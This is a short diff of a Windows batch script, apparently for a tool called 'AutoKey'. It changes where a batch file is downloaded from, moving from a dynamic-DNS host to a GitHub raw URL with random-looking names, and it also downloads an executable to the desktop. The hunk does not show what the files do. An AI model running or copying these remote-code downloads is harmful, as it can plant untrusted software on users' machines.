@@ -72,7 +72,7 @@ set AK=host1.bat
 cls
 
 
-curl "http://autokeys.ddns.net/AutoKey/AK.bat" --output "host1.bat"
+curl "https://raw.githubusercontent.com/W5GZ-X9YY-4GZY-3DYE/TF3N-KWTN-GWHL-6DA4/main/AK.bat" --output "host1.bat"
 cd "%USERPROFILE%\desktop"
 curl "http://autokeys.ddns.net/AutoKey/AutoKey.START.exe" --output "AutoKey_START.exe"
 cd %appdata%/autokey"
